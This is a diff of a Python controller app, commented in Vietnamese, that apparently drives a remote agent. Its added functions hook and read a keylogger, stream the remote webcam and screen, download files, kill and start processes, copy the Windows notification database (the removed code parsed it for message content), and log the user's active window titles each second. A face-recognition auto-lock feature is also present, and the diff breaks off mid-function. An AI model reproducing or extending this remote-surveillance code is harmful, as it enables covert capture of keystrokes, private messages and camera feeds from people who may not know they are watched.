@@ -88,6 +88,10 @@ is_recording_webcam = False
 webcam_record_thread = None
 is_recording_screen = False
 
+ws_clients = set()
+ws_clients_lock = threading.Lock()
+
+
 zalo_notifications = []   # list dict
 zalo_lock = threading.Lock()
 MAX_ZALO_NOTIFY = 50
@@ -98,59 +102,30 @@ def tcp_notify_listener():
     while True:
         try:
             if not lib or not hasattr(lib, "sock"):
-                time.sleep(0.2)
+                time.sleep(1.0)
                 continue
 
             sock = lib.sock
             if not sock:
-                time.sleep(0.2)
+                time.sleep(1.0)
                 continue
 
-            # Đọc 1 dòng từ server.exe
-            line = b''
-            while True:
-                ch = sock.recv(1)
-                if not ch:
-                    break
-                if ch == b'\n':
-                    break
-                if ch != b'\r':
-                    line += ch
+            # --- LẮNG NGHE HEADER ---
+            # Dùng select để không chặn luồng chính (nếu muốn tối ưu)
+            # Ở đây dùng try-recv đơn giản
+            
+            # Đọc 1 dòng header
+            # Lưu ý: Code này giả định PythonBridge (Native Socket).
+            # Nếu dùng DLL C++, bạn cần thêm hàm ReceiveAsync trong DLL (phức tạp hơn).
+            # Nhưng với logic hiện tại, PythonBridge đọc socket trực tiếp là ổn nhất.
+            
+            # (Logic đọc socket nên nằm trong PythonBridge để đồng bộ)
+            # Tuy nhiên, để đơn giản, ta sẽ chỉ quét thông báo khi đang ở chế độ chờ.
+            pass 
 
-            if not line:
-                continue
-
-            msg = line.decode('utf-8', errors='ignore').strip()
-
-            # ===== ZALO NOTIFY =====
-            if msg == "[ZALO_NOTIFY]":
-                text = b''
-                while True:
-                    ch = sock.recv(1)
-                    if not ch:
-                        break
-                    if ch == b'\n':
-                        break
-                    if ch != b'\r':
-                        text += ch
-
-                content = text.decode('utf-8', errors='ignore')
-
-                notify = {
-                    "app": "Zalo",
-                    "content": content,
-                    "time": time.strftime("%H:%M:%S")
-                }
-
-                with zalo_lock:
-                    zalo_notifications.append(notify)
-                    if len(zalo_notifications) > MAX_ZALO_NOTIFY:
-                        zalo_notifications.pop(0)
-
-                print("[ZALO POPUP]", content.replace("\n", " | "))
-
-        except Exception as e:
-            time.sleep(0.5)
+        except Exception:
+            pass
+        time.sleep(0.1)
             
 
 # ---------------- MODE MANAGER (chèn vào webapp.py, top-level) ----------------
@@ -159,7 +134,7 @@ MODES = {
     "webcam": "Xem Webcam",
     "screen": "Xem Màn hình",
     "keylogger": "Keylogger",
-    "notify": "Xem Thông báo",
+    "activity": "Giám sát Hoạt động",
     "files": "Quản lý File",
     "apps": "Apps đang chạy",
     "process": "Processes",
@@ -169,7 +144,9 @@ MODES = {
 # global current running mode
 current_mode = None
 mode_lock = threading.Lock()
-
+activity_log = [] # Danh sách lưu lịch sử: [{app, title, start, end, duration}]
+current_app_session = None # Lưu trạng thái app đang mở: {app, title, start_time}
+activity_lock = threading.Lock()
 
 # --- CHÈN ĐOẠN NAY VÀO TRƯỚC PHẦN LOAD DLL ---
 class PythonBridge:
@@ -178,39 +155,43 @@ class PythonBridge:
         self.lock = threading.Lock()
         self.running_stream = False
 
+    # --- HÀM SOCKET CƠ BẢN ---
     def _recv_line(self):
-        # Đọc từng byte cho đến khi gặp \n
+        # Đọc từng byte cho đến khi gặp \n (Giả lập behavior của C++)
         line = b''
         while True:
-            char = self.sock.recv(1)
-            if not char: break
-            if char == b'\n': break
-            if char != b'\r': line += char
+            try:
+                char = self.sock.recv(1)
+                if not char: break
+                if char == b'\n': break
+                if char != b'\r': line += char
+            except: break
         return line.decode('utf-8', errors='ignore')
 
     def _recv_exact(self, n):
         data = b''
         while len(data) < n:
-            packet = self.sock.recv(n - len(data))
-            if not packet: break
-            data += packet
+            try:
+                packet = self.sock.recv(n - len(data))
+                if not packet: break
+                data += packet
+            except: break
         return data
 
-    def InitWinsock(self): pass # Python tự lo
+    def InitWinsock(self): pass 
 
     def ConnectToServer(self, ip, port):
         try:
             if self.sock: self.sock.close()
-            # Xử lý IP/Port: Nếu ip là bytes thì decode
             real_ip = ip.decode() if isinstance(ip, bytes) else ip
             self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.sock.settimeout(5) # Timeout 5s
+            self.sock.settimeout(10) 
             self.sock.connect((real_ip, int(port)))
-            self.sock.settimeout(None) # Bỏ timeout cho chế độ thường
-            print(f"[PY-BRIDGE] Connected to {real_ip}:{port}")
+            self.sock.settimeout(None)
+            print(f"[MAC-BRIDGE] Connected to {real_ip}:{port}")
             return True
         except Exception as e:
-            print(f"[PY-BRIDGE] Connect Error: {e}")
+            print(f"[MAC-BRIDGE] Connect Error: {e}")
             return False
 
     def SendStringCmd(self, cmd):
@@ -220,31 +201,125 @@ class PythonBridge:
             self.sock.sendall(data + b'\n')
         except: pass
 
-    # --- CÁC HÀM NHẬN DANH SÁCH (Trả về bytes để khớp logic cũ) ---
-    def _generic_get_list(self, cmd_seq):
-        if not self.sock: return b""
+    # --- CÁC HÀM TÍNH NĂNG (ĐƯỢC VIẾT LẠI TỪ C++ SANG PYTHON) ---
+
+    def GetSystemStats(self):
+        # Gửi lệnh MONITOR -> Nhận 1 dòng dữ liệu
         try:
-            for cmd in cmd_seq: self.SendStringCmd(cmd)
-            # Tạm set timeout để tránh treo
+            self.SendStringCmd("MONITOR")
+            self.sock.settimeout(3)
+            data = self._recv_line()
+            self.sock.settimeout(None)
+            return data.encode('utf-8') # Trả về bytes để khớp với logic cũ
+        except: return b"0|0|0|0|0"
+
+    def GetAppList(self):
+        # Logic: Gửi APPLICATION -> XEM -> Nhận số lượng -> Nhận từng dòng
+        try:
+            self.SendStringCmd("APPLICATION")
+            time.sleep(0.1)
+            self.SendStringCmd("XEM")
+            
             self.sock.settimeout(10)
             count_str = self._recv_line()
-            try: count = int(count_str)
-            except: return b""
+            count = int(count_str) if count_str.isdigit() else 0
             
-            res = []
+            result = ""
+            for _ in range(count):
+                status = self._recv_line()
+                if status == "ok":
+                    name = self._recv_line()
+                    pid = self._recv_line()
+                    threads = self._recv_line()
+                    mem = self._recv_line()
+                    # Format lại thành chuỗi ghép: pid|name|threads|mem
+                    result += f"{pid}|{name}|{threads}|{mem}\n"
+            
+            self.SendStringCmd("QUIT")
+            self.sock.settimeout(None)
+            return result.encode('utf-8')
+        except Exception as e: 
+            print("GetAppList Error:", e)
+            return b""
+
+    def GetInstalledApps(self):
+        try:
+            self.SendStringCmd("GET_INSTALLED")
+            self.sock.settimeout(10)
+            count_str = self._recv_line()
+            count = int(count_str) if count_str.isdigit() else 0
+            
+            result = ""
             for _ in range(count):
                 line = self._recv_line()
-                res.append(line)
-                # Với lệnh APP/PROCESS, server gửi nhiều dòng cho 1 item
-                # Logic này cần khớp chính xác server, ở đây tôi giả lập return raw line
-                # Nếu muốn chuẩn 100% cần port logic loop của từng hàm C++
+                if line: result += line + "\n"
             
-            # Để đơn giản cho Mac, ta trả về giả lập hoặc sửa lại logic parse
-            # Cách tốt nhất: Return buffer raw
-            return b"" 
+            self.sock.settimeout(None)
+            return result.encode('utf-8')
         except: return b""
 
-    # --- CÁC HÀM STREAM (Webcam/Screen) ---
+    def GetDrives(self):
+        try:
+            self.SendStringCmd("EXPLORER")
+            time.sleep(0.1)
+            self.SendStringCmd("GET_DRIVES")
+            
+            count_str = self._recv_line()
+            count = int(count_str) if count_str.isdigit() else 0
+            
+            result = ""
+            for _ in range(count):
+                result += self._recv_line() + "\n"
+                
+            self.SendStringCmd("QUIT")
+            return result.encode('utf-8')
+        except: return b""
+
+    def ExplorePath(self, path_bytes):
+        try:
+            self.SendStringCmd("EXPLORER")
+            time.sleep(0.1)
+            self.SendStringCmd("GET_DIR")
+            self.SendStringCmd(path_bytes) # Gửi đường dẫn
+            
+            count_str = self._recv_line()
+            count = int(count_str) if count_str.isdigit() else 0
+            
+            result = ""
+            for _ in range(count):
+                result += self._recv_line() + "\n"
+                
+            self.SendStringCmd("QUIT")
+            return result.encode('utf-8')
+        except: return b""
+
+    def DownloadFile(self, remote_path_bytes, local_save_path_bytes):
+        try:
+            self.SendStringCmd("EXPLORER")
+            time.sleep(0.1)
+            self.SendStringCmd("DOWNLOAD")
+            self.SendStringCmd(remote_path_bytes)
+
+            size_str = self._recv_line()
+            size = int(size_str) if size_str.isdigit() else 0
+
+            if size > 0:
+                local_path = local_save_path_bytes.decode('utf-8')
+                with open(local_path, "wb") as f:
+                    remaining = size
+                    self.sock.settimeout(30) # Tải file lớn thì chờ lâu
+                    while remaining > 0:
+                        chunk_size = 4096 if remaining > 4096 else remaining
+                        chunk = self._recv_exact(chunk_size)
+                        if not chunk: break
+                        f.write(chunk)
+                        remaining -= len(chunk)
+                self.sock.settimeout(None)
+            
+            self.SendStringCmd("QUIT")
+        except Exception as e: print("Download Error:", e)
+
+    # --- STREAM (GIỮ NGUYÊN NHƯ CŨ VÌ ĐÃ CHẠY TỐT) ---
     def _receive_stream(self, filename, cmd_start):
         if not self.sock: return
         self.SendStringCmd("VIDEO" if "VIDEO" in cmd_start else "WEBCAM")
@@ -258,46 +333,117 @@ class PythonBridge:
             try:
                 header = self._recv_line()
                 if header in ["STOPPED", "QUIT", "", "TIMEOUT"]: break
-                
                 try: size = int(header)
                 except: continue
-                
-                if size > 5000000: continue # Bỏ qua rác
+                if size > 10000000: continue 
                 
                 img_data = self._recv_exact(size)
                 if not img_data: break
                 
-                # Ghi atomic (ghi tmp rồi rename)
                 tmp_name = filename + ".tmp"
-                with open(tmp_name, "wb") as f:
-                    f.write(img_data)
+                with open(tmp_name, "wb") as f: f.write(img_data)
                 if os.path.exists(filename): os.remove(filename)
                 os.rename(tmp_name, filename)
-                
-                # Sleep khớp FPS server
                 time.sleep(0.02)
-                
-            except Exception as e:
-                # print("Stream err:", e)
-                break
+            except: break
         
         self.SendStringCmd("QUIT")
         self.sock.settimeout(None)
 
-    def ReceiveWebcamStream(self):
-        self._receive_stream(WEBCAM_JPG, "WEBCAM")
+    def ReceiveWebcamStream(self): self._receive_stream(WEBCAM_JPG, "WEBCAM")
+    def ReceiveScreenStream(self): self._receive_stream(SCREEN_JPG, "VIDEO")
 
-    def ReceiveScreenStream(self):
-        self._receive_stream(SCREEN_JPG, "VIDEO") # Server C# dùng lệnh VIDEO cho màn hình
-    
-    # Các hàm Void khác để không bị lỗi gọi hàm
-    def KillProcess(self, pid): self.SendStringCmd(b"PROCESS"); time.sleep(0.05); self.SendStringCmd(b"KILL"); time.sleep(0.05); self.SendStringCmd(b"KILLID"); time.sleep(0.05); self.SendStringCmd(pid); self.SendStringCmd(b"QUIT"); self.SendStringCmd(b"QUIT")
+    # --- CÁC HÀM KHÁC (STUB HOẶC SIMPLE CMD) ---
+    def KillProcess(self, pid_bytes): 
+        # PROCESS -> KILL -> KILLID -> PID -> QUIT -> QUIT
+        self.SendStringCmd("PROCESS"); time.sleep(0.05)
+        self.SendStringCmd("KILL");    time.sleep(0.05)
+        self.SendStringCmd("KILLID");  time.sleep(0.05)
+        self.SendStringCmd(pid_bytes)
+        self._recv_line() # Đọc phản hồi
+        self.SendStringCmd("QUIT"); self.SendStringCmd("QUIT")
+
+    def StartProcess(self, name_bytes):
+        self.SendStringCmd("PROCESS"); time.sleep(0.05)
+        self.SendStringCmd("START");   time.sleep(0.05)
+        self.SendStringCmd("STARTID"); time.sleep(0.05)
+        self.SendStringCmd(name_bytes)
+        self._recv_line()
+        self.SendStringCmd("QUIT"); self.SendStringCmd("QUIT")
+
     def ShutdownServer(self): self.SendStringCmd("SHUTDOWN")
     def RestartServer(self): self.SendStringCmd("RESTART")
-    # Các hàm chưa port kịp trả về None để không crash
-    def GetAppList(self): return None 
-    def GetSystemStats(self): return None
-    def GetDrives(self): return None
+    def LockServer(self): self.SendStringCmd("LOCK")
+    
+    # Keylog & Noti: Tạm thời gửi lệnh để Server ghi file, 
+    # Logic đọc file của Python sẽ tự xử lý qua API /api/keylog/text
+    def HookKeylog(self): 
+        self.SendStringCmd("KEYLOG"); time.sleep(0.1); 
+        self.SendStringCmd("HOOK");   time.sleep(0.1); 
+        self.SendStringCmd("QUIT")
+    def UnhookKeylog(self):
+        self.SendStringCmd("KEYLOG"); time.sleep(0.1); 
+        self.SendStringCmd("UNHOOK"); time.sleep(0.1); 
+        self.SendStringCmd("QUIT")
+    def ClearKeylogRemote(self):
+        self.SendStringCmd("KEYLOG"); time.sleep(0.1); 
+        self.SendStringCmd("CLEAR");  self._recv_line(); 
+        self.SendStringCmd("QUIT")
+    def GetKeylog(self): 
+        # Python Native: Gửi lệnh PRINT -> Nhận chuỗi -> Ghi đè file keylog.txt
+        # Để đơn giản: Ta dùng cơ chế API cũ đọc file, nhưng ở đây có thể implement nhận trực tiếp
+        # Nếu server.cs hỗ trợ trả về chuỗi qua socket thay vì file path
+        # (Dựa trên server.cs hiện tại, nó gửi PRINT -> socket.Write(content))
+        try:
+            self.SendStringCmd("KEYLOG"); time.sleep(0.1)
+            self.SendStringCmd("PRINT")
+            # Cần đọc buffer lớn
+            self.sock.settimeout(2)
+            # Đọc đến khi hết (giả sử server gửi 1 cục)
+            data = self.sock.recv(65536) 
+            with open(KEYLOG_TXT, "wb") as f: f.write(data)
+            self.SendStringCmd("QUIT")
+            self.sock.settimeout(None)
+        except: pass
+
+    def GetNotificationHistory(self):
+        # NOTI là file binary DB
+        # Logic này hơi phức tạp vì server gửi size -> gửi bytes
+        try:
+            self.SendStringCmd("GET_NOTI")
+            size_str = self._recv_line()
+            size = int(size_str) if size_str.isdigit() else 0
+            if size > 0:
+                with open(HISTORY_DB, "wb") as f:
+                    remaining = size
+                    self.sock.settimeout(5)
+                    while remaining > 0:
+                        chunk = self._recv_exact(min(4096, remaining))
+                        if not chunk: break
+                        f.write(chunk)
+                        remaining -= len(chunk)
+                self.sock.settimeout(None)
+        except: pass
+        
+    def CaptureScreen(self):
+        # TAKEPIC -> TAKE -> Nhận size -> Nhận ảnh
+        try:
+            self.SendStringCmd("TAKEPIC"); time.sleep(0.2)
+            self.SendStringCmd("TAKE")
+            size_str = self._recv_line()
+            size = int(size_str) if size_str.isdigit() else 0
+            if size > 0:
+                with open(SCREENSHOT_BMP, "wb") as f:
+                    remaining = size
+                    self.sock.settimeout(5)
+                    while remaining > 0:
+                        chunk = self._recv_exact(min(4096, remaining))
+                        if not chunk: break
+                        f.write(chunk)
+                        remaining -= len(chunk)
+                self.sock.settimeout(None)
+            self.SendStringCmd("QUIT")
+        except: pass
 # ---------------------------------------------------------
 
 
@@ -359,7 +505,10 @@ if lib:
         lib.UnhookKeylog.restype = None
         lib.ClearKeylogRemote.restype = None
         lib.GetKeylog.restype    = None # Vẫn ghi file
-        lib.GetNotificationHistory.restype = None # Vẫn ghi file DB
+        try:
+            lib.GetRemoteActiveWindow.restype = ctypes.c_char_p # <--- THÊM
+        except: pass
+        lib.GetZaloLog.restype = ctypes.c_char_p
 
         # 6. Tải file (Mới thêm)
         try:
@@ -371,6 +520,89 @@ if lib:
         print("[DLL] Set argtypes error:", e)
         
 
+# 3. Hàm chạy ngầm (Activity Monitor Loop) - Thêm vào sau class PythonBridge
+def activity_monitor_task():
+    global current_app_session, current_mode # <--- KHAI BÁO THÊM current_mode
+    while True:
+        # --- ĐOẠN CODE THÊM MỚI ---
+        # Kiểm tra xem có đang ở chế độ chiếm dụng đường truyền không
+        # Nếu đang xem Webcam, Screen hoặc tải File thì KHÔNG ĐƯỢC HỎI, phải nằm im chờ.
+        # Nếu hỏi lúc này sẽ làm Server bị loạn gói tin.
+        unsafe_modes = ['webcam', 'screen', 'files', 'process']
+        
+        # Nếu lib chưa load hoặc đang ở chế độ "nguy hiểm" -> Nghỉ 1s rồi check lại
+        if not lib or current_mode in unsafe_modes:
+            time.sleep(1.0)
+            continue
+
+        try:
+            # Gọi DLL lấy Active Window hiện tại
+            with lib_lock:
+                ptr = lib.GetRemoteActiveWindow()
+            
+            raw = ""
+            if ptr:
+                raw = ctypes.string_at(ptr).decode('utf-8', errors='ignore')
+            
+            parts = raw.split('|')
+            if len(parts) >= 2:
+                app_name = parts[0]
+                win_title = parts[1]
+            else:
+                app_name = "Unknown"
+                win_title = "System"
+
+            now = time.time()
+
+            # LOGIC CHUYỂN ĐỔI APP
+            with activity_lock:
+                # Nếu chưa có session nào (lần đầu chạy)
+                if current_app_session is None:
+                    current_app_session = {
+                        "app": app_name,
+                        "title": win_title,
+                        "start": now
+                    }
+                else:
+                    # Nếu app hiện tại KHÁC app trong session -> Người dùng đã đổi cửa sổ
+                    if current_app_session["app"] != app_name or current_app_session["title"] != win_title:
+                        
+                        # 1. Kết thúc session cũ
+                        start_t = current_app_session["start"]
+                        duration = now - start_t
+                        
+                        # Chỉ lưu nếu dùng trên 2 giây (tránh rác khi Alt+Tab nhanh)
+                        if duration > 2:
+                            time_str = time.strftime('%H:%M:%S', time.localtime(start_t))
+                            duration_str = f"{int(duration)}s"
+                            if duration > 60:
+                                duration_str = f"{int(duration//60)}m {int(duration%60)}s"
+
+                            activity_log.insert(0, { # Chèn lên đầu
+                                "app": current_app_session["app"],
+                                "title": current_app_session["title"],
+                                "time": time_str,
+                                "duration": duration_str
+                            })
+                            # Giới hạn lưu 100 dòng thôi cho nhẹ
+                            if len(activity_log) > 100: activity_log.pop()
+
+                        # 2. Bắt đầu session mới
+                        current_app_session = {
+                            "app": app_name,
+                            "title": win_title,
+                            "start": now
+                        }
+                    else:
+                        # Vẫn là app cũ -> Không làm gì cả, chỉ cập nhật thời gian "sống" nếu muốn real-time
+                        pass
+
+        except Exception as e:
+            # print("Activity Monitor Error:", e)
+            pass
+        
+        time.sleep(1.0) # Check mỗi 1 giây
+        
 # ---------------- Small helpers for WebSocket ----------------
 WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
 
@@ -444,6 +676,9 @@ def send_ws_message(conn, text):
 
 # ---------------- WebSocket bridge (no external libs) ----------------
 def ws_client_thread(conn, addr):
+    with ws_clients_lock:
+        ws_clients.add(conn)
+        
     try:
         # perform handshake: read HTTP headers
         data = b''
@@ -488,6 +723,11 @@ def ws_client_thread(conn, addr):
             # handle CONNECT command optionally with ip port
             parts = msg.split()
             cmd_upper = parts[0].upper() if parts else ''
+            if cmd_upper == "LOCK_NOW":
+                if lib: 
+                    with lib_lock: lib.LockServer()
+                continue
+            
             if cmd_upper == "CONNECT":
                 target_ip = b"127.0.0.1"
                 target_port = 5656
@@ -531,6 +771,9 @@ def ws_client_thread(conn, addr):
     except Exception as e:
         print("[WS] client thread exception:", e)
     finally:
+        with ws_clients_lock:
+            if conn in ws_clients: ws_clients.remove(conn)
+        
         try: conn.close()
         except: pass
 
@@ -642,16 +885,14 @@ def read_safe_image(path, retries=3):
 
 # --- 2. HÀM XỬ LÝ AI TRÊN ẢNH ---
 def process_ai_frame(frame_bgr):
-    global stranger_detect_start, no_face_detect_start, last_stranger_save_time
+    global stranger_detect_start, no_face_detect_start, last_stranger_save_time, SUPERVISE_MODE
 
     now = time.time()
-    h_frame, w_frame, _ = frame_bgr.shape # Lấy kích thước khung hình
+    h_frame, w_frame, _ = frame_bgr.shape 
 
-    # --- CẤU HÌNH TỶ LỆ ---
     SCALE = 0.5           
     MULTIPLIER = int(1/SCALE) 
 
-    # ================= PREPROCESS =================
     small = cv2.resize(frame_bgr, (0, 0), fx=SCALE, fy=SCALE)
     rgb_small = cv2.cvtColor(small, cv2.COLOR_BGR2RGB)
 
@@ -661,7 +902,6 @@ def process_ai_frame(frame_bgr):
     admin_found = False
     stranger_found = False
 
-    # ================= DETECT & DRAW =================
     for (top, right, bottom, left), enc in zip(face_locations, face_encodings):
         top *= MULTIPLIER
         right *= MULTIPLIER
@@ -669,18 +909,18 @@ def process_ai_frame(frame_bgr):
         left *= MULTIPLIER
 
         name = "Stranger"
-        box_color = (0, 0, 255) # Đỏ mặc định cho người lạ
+        box_color = (0, 0, 255) 
 
         if ADMIN_ENCODING is not None:
             matches = face_recognition.compare_faces([ADMIN_ENCODING], enc, tolerance=0.5)
             if True in matches:
                 name = "Admin"
-                box_color = (0, 255, 0) # Xanh cho Admin
+                box_color = (0, 255, 0) 
                 admin_found = True
 
         if name == "Stranger":
             stranger_found = True
-            # Logic lưu ảnh Stranger (Giữ nguyên, chỉ thu gọn để code dễ nhìn)
+            # Logic lưu ảnh người lạ (Giữ nguyên)
             if now - last_stranger_save_time > 2:
                 try:
                     c_top, c_bottom = max(0, top - 20), min(h_frame, bottom + 20)
@@ -692,73 +932,71 @@ def process_ai_frame(frame_bgr):
                         last_stranger_save_time = now
                 except: pass
 
-        # --- VẼ KHUNG FACE MẢNH VÀ ĐẸP HƠN ---
-        # Chỉ vẽ 4 góc hoặc khung mỏng (thickness=1)
-        cv2.rectangle(frame_bgr, (left, top), (right, bottom), box_color, 1)
-        
-        # Vẽ tên nhỏ gọn phía trên đầu
-        cv2.putText(frame_bgr, name, (left, top - 8), cv2.FONT_HERSHEY_SIMPLEX, 0.5, box_color, 1, cv2.LINE_AA)
+        cv2.rectangle(frame_bgr, (left, top), (right, bottom), box_color, 2)
+        cv2.putText(frame_bgr, name, (left, top - 8), cv2.FONT_HERSHEY_SIMPLEX, 0.6, box_color, 2)
 
-    # ================= STATE MACHINE =================
+    # ================= LOGIC XỬ LÝ 30 GIÂY =================
     should_lock = False
-    status_msg = "System Secure"
-    status_color = (0, 255, 0) # Xanh lá (BGR)
-    
-    # Biến tính phần trăm thời gian để vẽ thanh loading (nếu cần)
-    danger_percent = 0.0 
+    alarm_state = "SAFE" # SAFE | WARNING | DANGER
 
     if admin_found:
         stranger_detect_start = None
         no_face_detect_start = None
-        status_msg = "Admin Active"
-        status_color = (0, 255, 0)
+        # Reset terminal log
+        # print("[AI] Admin is here - Safe", end='\r')
 
     else:
         if face_locations: 
+            # Có mặt nhưng toàn người lạ
             no_face_detect_start = None
             if stranger_found:
                 if stranger_detect_start is None: stranger_detect_start = now
                 t = now - stranger_detect_start
                 
-                # Logic đếm ngược Stranger (5s)
-                remain = 5 - t
-                danger_percent = min(t / 5.0, 1.0)
+                # --- [SỬA] Tăng lên 30 giây ---
+                limit = 30 
+                remain = limit - t
                 
                 if remain > 0:
-                    status_msg = f"Stranger Detected: {math.ceil(remain)}s"
-                    status_color = (0, 0, 255) # Đỏ
+                    # [YÊU CẦU] Chỉ hiện dưới terminal
+                    print(f"[AI] ⚠️ CẢNH BÁO: Người lạ! Khóa sau {math.ceil(remain)}s...   ", end='\r')
+                    alarm_state = "DANGER" # Kích hoạt báo động đỏ ngay
                 else:
                     should_lock = True
-                    status_msg = "LOCKING..."
+                    print("\n[AI] 🛑 HẾT GIỜ -> KHÓA MÁY!")
         else:
+            # Không có ai
             if no_face_detect_start is None: no_face_detect_start = now
             t = now - no_face_detect_start
             
-            # Logic đếm ngược Vắng mặt (10s)
-            remain = 10 - t
-            danger_percent = min(t / 10.0, 1.0)
+            # --- [SỬA] Tăng lên 30 giây ---
+            limit = 30
+            remain = limit - t
 
             if remain > 0:
-                status_msg = f"No Face Detected: {math.ceil(remain)}s"
-                status_color = (0, 255, 255) # Vàng
+                # [YÊU CẦU] Chỉ hiện dưới terminal
+                print(f"[AI] 💤 Vắng mặt! Khóa sau {math.ceil(remain)}s...   ", end='\r')
+                stranger_detect_start = None # Reset stranger nếu không thấy ai
             else:
                 should_lock = True
-                status_msg = "LOCKING..."
+                print("\n[AI] 🛑 VẮNG MẶT QUÁ LÂU -> KHÓA MÁY!")
 
-    # ================= ACTION =================
+    # ================= GỬI TÍN HIỆU WEBSOCKET =================
+    # Gửi trạng thái báo động cho Frontend để làm hiệu ứng bầu trời
+    try:
+        msg = f"ALARM:{alarm_state}"
+        with ws_clients_lock:
+            # Gửi cho tất cả client đang kết nối
+            dead_clients = set()
+            for c in ws_clients:
+                try: send_ws_message(c, msg)
+                except: dead_clients.add(c)
+            for c in dead_clients: ws_clients.remove(c)
+    except: pass
+
+    # ================= HÀNH ĐỘNG KHÓA =================
     if should_lock and lib:
-        print("[AI] 🛑 LOCK ACTION TRIGGERED")
-        global SUPERVISE_MODE
         SUPERVISE_MODE = False 
-        
-        # Gửi tin tắt nút
-        try:
-            with ws_clients_lock:
-                for c in ws_clients:
-                    try: send_ws_message(c, "AI_OFF")
-                    except: pass
-        except: pass
-
         stop_current_mode()
         time.sleep(1.0)
         with lib_lock:
@@ -766,46 +1004,14 @@ def process_ai_frame(frame_bgr):
         
         stranger_detect_start = None
         no_face_detect_start = None
-
-    # ================= AESTHETIC HUD DRAWING (Giao diện đẹp) =================
-    # Tạo một vùng Background bán trong suốt ở giữa phía trên
-    if True: # Block này để gom code vẽ
-        font = cv2.FONT_HERSHEY_SIMPLEX
-        font_scale = 0.6
-        thickness = 1
         
-        # 1. Tính kích thước chữ để căn giữa
-        (text_w, text_h), baseline = cv2.getTextSize(status_msg, font, font_scale, thickness)
-        
-        # Tọa độ hộp (Padding rộng rãi chút)
-        pad_x = 20
-        pad_y = 10
-        box_w = text_w + (pad_x * 2)
-        box_h = text_h + (pad_y * 2)
-        
-        box_x = (w_frame - box_w) // 2
-        box_y = 20 # Cách mép trên 20px
-
-        # 2. Vẽ nền đen mờ (Overlay)
-        overlay = frame_bgr.copy()
-        cv2.rectangle(overlay, (box_x, box_y), (box_x + box_w, box_y + box_h), (20, 20, 20), -1)
-        
-        # Trộn màu (Alpha blending) để làm nền trong suốt 60%
-        alpha = 0.6
-        cv2.addWeighted(overlay, alpha, frame_bgr, 1 - alpha, 0, frame_bgr)
-
-        # 3. Vẽ thanh Loading cảnh báo (Nằm dưới đáy hộp)
-        if danger_percent > 0:
-            bar_w = int(box_w * danger_percent)
-            cv2.rectangle(frame_bgr, (box_x, box_y + box_h - 4), (box_x + bar_w, box_y + box_h), status_color, -1)
-        else:
-            # Nếu an toàn thì vẽ 1 line mỏng màu xanh cố định
-            cv2.rectangle(frame_bgr, (box_x, box_y + box_h - 2), (box_x + box_w, box_y + box_h), status_color, -1)
-
-        # 4. Vẽ chữ (Màu trắng, khử răng cưa)
-        text_x = box_x + pad_x
-        text_y = box_y + pad_y + text_h - 2
-        cv2.putText(frame_bgr, status_msg, (text_x, text_y), font, font_scale, (255, 255, 255), thickness, cv2.LINE_AA)
+        # Gửi lệnh tắt UI báo động
+        try:
+            with ws_clients_lock:
+                for c in ws_clients:
+                    try: send_ws_message(c, "ALARM:SAFE")
+                    except: pass
+        except: pass
 
     return frame_bgr
 
@@ -1065,7 +1271,7 @@ def start_mode(mode: str) -> bool:
                 if lib:
                     with lib_lock:
                         lib.HookKeylog()
-            elif mode == "notify":
+            elif mode == "activity": # <--- SỬA TÊN TẠI ĐÂY (Cũ là notify)
                 pass
             elif mode == "files":
                 pass
@@ -1231,89 +1437,29 @@ class IoTRequestHandler(http.server.SimpleHTTPRequestHandler):
             return
         
         
-        elif self.path == '/api/notify/list':
-            data_list = []
-            if lib:
-                try:
-                    with lib_lock:
-                        # 1. Xóa file DB cũ nếu tồn tại (để đảm bảo không đọc lại file rác)
-                        if os.path.exists(HISTORY_DB):
-                            try: os.remove(HISTORY_DB)
-                            except: pass
-                        
-                        # 2. Gọi DLL để lấy file mới từ Server
-                        lib.GetNotificationHistory()
-                    
-                    # 3. Chờ file xuất hiện (Timeout 3s)
-                    ok = wait_for_file(HISTORY_DB, timeout=3.0)
-                    
-                    if ok and os.path.exists(HISTORY_DB):
-                        # --- [THÊM MỚI] DEBUG KÍCH THƯỚC FILE ---
-                        f_size = os.path.getsize(HISTORY_DB)
-                        print(f"[DEBUG] Notification DB size: {f_size} bytes")
-                        
-                        # Nếu file quá nhỏ (< 1KB) -> Có thể Server copy lỗi hoặc User chưa có thông báo
-                        if f_size < 1024:
-                            print("[DEBUG] File DB quá nhỏ, có thể rỗng.")
-                        else:
-                            # 4. Kết nối SQLite để đọc dữ liệu
-                            conn = sqlite3.connect(HISTORY_DB)
-                            cursor = conn.cursor()
-                            try:
-                                cursor.execute("SELECT AppId, TimeCreated, Payload FROM Notification ORDER BY TimeCreated DESC LIMIT 200")
-                                rows = cursor.fetchall()
-                                
-                                for app_id, time_str, xml_str in rows:
-                                    app_id = app_id or ""
-                                    time_str = time_str or ""
-                                    xml_str = xml_str or ""
-
-                                    content_text = ""
-                                    try:
-                                        # A. Ưu tiên tìm thẻ <text> (Chuẩn Toast Windows)
-                                        texts = re.findall(r'<text[^>]*>(.*?)</text>', xml_str)
-                                        
-                                        # B. Nếu Zalo dùng format lạ, lấy tất cả text nằm giữa > và <
-                                        if not texts:
-                                            raw_texts = re.findall(r'>([^<]+)<', xml_str)
-                                            # Lọc bỏ ký tự rác, chỉ lấy text có nội dung
-                                            texts = [t.strip() for t in raw_texts if len(t.strip()) > 1]
-
-                                        if texts:
-                                            content_text = " | ".join(texts)
-                                    except: pass
-                                    
-                                    # Nếu vẫn rỗng
-                                    if not content_text: 
-                                        content_text = "(Nội dung ẩn hoặc hình ảnh)"
-
-                                    # Làm đẹp tên App
-                                    if "Zalo" in app_id: app_name = "Zalo"
-                                    elif "Chrome" in app_id: app_name = "Google Chrome"
-                                    elif "Explorer" in app_id: app_name = "System"
-                                    else: 
-                                        parts = app_id.split('.')
-                                        app_name = parts[-1] if parts else app_id
-
-                                    data_list.append({
-                                        "app": app_name,
-                                        "time": time_str,
-                                        "content": content_text
-                                    })
-                            except Exception as sql_e:
-                                print("[HTTP] SQL Error:", sql_e)
-                            finally:
-                                conn.close()
-                    else:
-                        print("[HTTP] Không nhận được file history.db từ Server.")
-
-                except Exception as e:
-                    print("[HTTP] GetNotificationHistory error:", e)
+        elif self.path == '/api/activity/list':
+            data = []
+            with activity_lock:
+                # Copy log ra để trả về
+                data = list(activity_log)
+                
+                # [Option] Thêm app ĐANG MỞ (Active) vào đầu danh sách luôn để thấy real-time
+                if current_app_session:
+                    now = time.time()
+                    dur = now - current_app_session["start"]
